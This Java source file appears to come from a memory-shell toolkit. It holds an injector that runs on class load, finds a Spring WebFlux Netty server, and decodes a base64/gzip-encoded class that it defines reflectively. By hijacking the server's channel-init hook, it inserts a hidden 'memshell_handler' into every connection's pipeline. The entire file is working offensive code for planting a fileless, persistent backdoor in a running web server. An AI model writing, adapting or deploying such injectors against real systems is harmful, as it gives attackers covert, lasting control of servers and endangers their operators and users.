package com.reajason.javaweb.memshell.injector.springwebflux;

import io.netty.channel.Channel;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelPipeline;
import reactor.netty.ChannelPipelineConfigurer;
import reactor.netty.ConnectionObserver;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.SocketAddress;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2024/12/26
 */
public class SpringWebFluxNettyHandlerInjector implements ChannelPipelineConfigurer {

    static {
        new SpringWebFluxNettyHandlerInjector();
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public SpringWebFluxNettyHandlerInjector() {
        try {
            Object nettyServer = getNettyServer();
            handlerClass = getShellClass();
            inject(nettyServer);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private Class<?> handlerClass;

    public Object getNettyServer() throws Exception {
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            if (thread.getClass().getName().contains("NettyWebServer")) {
                return thread;
            }
        }
        return null;
    }

    private Class<?> getShellClass() throws Exception {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        try {
            return classLoader.loadClass(getClassName());
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            return (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
    }

    public void inject(Object nettyServer) throws Exception {
        Object config = getFieldValue(getFieldValue(nettyServer, "val$disposableServer"), "config");
        setFieldValue(config, "doOnChannelInit", this);
        System.out.println("netty handler injected successfully");
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;

        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
        } finally {
            if (gzipInputStream != null) {
                try {
                    gzipInputStream.close();
                } catch (IOException ignored) {
                }
            }
            out.close();
        }
        return out.toByteArray();
    }

    public Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null) {
                field = getField(clazz.getSuperclass(), fieldName);
            }
        }
        return field;
    }

    public Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    @Override
    public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, SocketAddress remoteAddress) {
        ChannelPipeline pipeline = channel.pipeline();
        try {
            pipeline.addBefore("reactor.left.httpTrafficHandler", "memshell_handler", ((ChannelHandler) handlerClass.newInstance()));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
